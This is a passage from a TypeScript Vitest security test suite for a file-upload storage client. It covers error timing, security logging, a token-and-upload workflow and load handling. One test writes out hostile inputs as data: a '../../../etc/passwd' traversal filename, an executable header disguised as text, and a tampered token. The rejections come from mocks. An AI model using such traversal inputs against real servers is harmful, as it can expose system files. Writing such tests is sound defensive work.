      for (const { type, delay } of errorScenarios) {
        const testFile = new File(['content'], 'test.txt', { type: 'text/plain' });
        
        mockPut.mockImplementation(() => 
          new Promise((_, reject) => {
            setTimeout(() => reject(new Error(`Generic error: ${type}`)), delay);
          })
        );

        const startTime = performance.now();
        
        try {
          await client.put('test.txt', testFile, {} as any);
        } catch (error) {
          const endTime = performance.now();
          timings.push(endTime - startTime);
        }
        
        mockPut.mockClear();
      }

      // All error responses should have similar timing
      const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
      const maxVariance = Math.max(...timings.map(t => Math.abs(t - avgTiming)));
      
      expect(maxVariance).toBeLessThan(50); // Less than 50ms variance
    });

    it('should log security events without exposing sensitive data', async () => {
      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      
      const securityEvents = [
        'Path traversal attempt detected',
        'Invalid file type uploaded', 
        'Rate limit exceeded',
        'Suspicious filename detected',
        'Token validation failed',
      ];

      for (const event of securityEvents) {
        const testFile = new File(['content'], 'test.txt', { type: 'text/plain' });
        
        // Mock error and ensure it gets logged
        mockPut.mockImplementation(() => {
          console.error(`Security event: ${event}`);
          return Promise.reject(new Error(event));
        });
        
        try {
          await client.put('test.txt', testFile, {} as any);
        } catch (error) {
          // Error should be logged for security monitoring
          expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('Security event'));
        }
        
        mockPut.mockClear();
        consoleSpy.mockClear();
      }

      consoleSpy.mockRestore();
    });
  });

  /**
   * Integration Security Tests
   * 
   * Tests security in realistic integration scenarios and end-to-end workflows.
   * Validates security measures work correctly in combination.
   */
  describe('Integration Security Tests', () => {
    it('should maintain security across complex upload workflows', async () => {
      // Simulate a complex workflow: token generation -> validation -> upload
      const workflow = {
        tokenRequest: {
          pathname: 'documents/report.pdf',
          maximumSizeInBytes: 5 * 1024 * 1024, // 5MB
          allowedContentTypes: ['application/pdf'],
        },
        uploadAttempt: {
          filename: 'documents/report.pdf',
          content: '%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog', // Valid PDF header
          contentType: 'application/pdf',
          size: 2 * 1024 * 1024, // 2MB
        },
      };

      // Step 1: Generate secure token
      mockGenerateClientToken.mockResolvedValue('secure.token.abc123');
      
      const token = await client.generateClientTokenFromReadWriteToken(workflow.tokenRequest as any);
      expect(token).toBe('secure.token.abc123');

      // Step 2: Validate token payload
      mockGetPayloadFromToken.mockResolvedValue(workflow.tokenRequest);
      
      const payload = await client.getPayloadFromClientToken(token);
      expect(payload).toEqual(workflow.tokenRequest);

      // Step 3: Perform secure upload
      const uploadFile = new File([workflow.uploadAttempt.content], workflow.uploadAttempt.filename, {
        type: workflow.uploadAttempt.contentType,
      });
      
      mockPut.mockResolvedValue({
        url: 'https://storage.example.com/documents/report.pdf',
        pathname: 'documents/report.pdf',
        contentType: 'application/pdf',
      });

      const result = await client.put(workflow.uploadAttempt.filename, uploadFile, { token } as any);
      expect(result.pathname).toBe('documents/report.pdf');
    });

    it('should detect and prevent coordinated attack attempts', async () => {
      // Simulate coordinated attack: multiple attack vectors simultaneously
      const coordinatedAttack = {
        maliciousFilename: '../../../etc/passwd',
        oversizedFile: new File(['x'.repeat(100 * 1024 * 1024)], 'huge.txt'), // 100MB
        spoofedMimeType: 'text/plain', // Claiming text but contains executable
        maliciousContent: 'MZ\x90\x00\x03\x00\x00\x00', // PE executable header
        tamperedToken: 'invalid.jwt.token',
        rapidRequests: 1000,
      };

      // All attack vectors should be detected and blocked
      const maliciousFile = new File([coordinatedAttack.maliciousContent], coordinatedAttack.maliciousFilename, {
        type: coordinatedAttack.spoofedMimeType,
      });

      // Mock comprehensive security rejection
      mockPut.mockRejectedValue(new Error('Multiple security violations detected'));

      await expect(client.put(coordinatedAttack.maliciousFilename, maliciousFile, {
        token: coordinatedAttack.tamperedToken,
      } as any)).rejects.toThrow(/Multiple security violations|Attack detected/i);
    });

    it('should maintain security under high load conditions', async () => {
      const highLoadTest = Array.from({ length: 500 }, (_, i) => ({
        filename: `load_test_${i}.txt`,
        content: `Content for file ${i}`,
        legitimate: i % 10 !== 0, // 10% malicious requests
      }));

      let securityViolations = 0;
      let successfulUploads = 0;

      mockPut.mockImplementation((filename: string) => {
        const testData = highLoadTest.find(t => t.filename === filename);
        
        if (!testData?.legitimate) {
          securityViolations++;
          return Promise.reject(new Error('Security violation detected'));
        }
        
        successfulUploads++;
        return Promise.resolve({
          url: `https://storage.example.com/${filename}`,
          pathname: filename,
        });
      });

      const promises = highLoadTest.map(({ filename, content }) => {
        const file = new File([content], filename, { type: 'text/plain' });
        return client.put(filename, file, {} as any).catch(error => error);
      });

      const results = await Promise.all(promises);
      
      // Security system should correctly identify and block malicious requests
      expect(securityViolations).toBe(50); // 10% of 500 requests
      expect(successfulUploads).toBe(450); // 90% of 500 requests
      
      const errors = results.filter(result => result instanceof Error);
      expect(errors.length).toBe(50);
    });
  });
});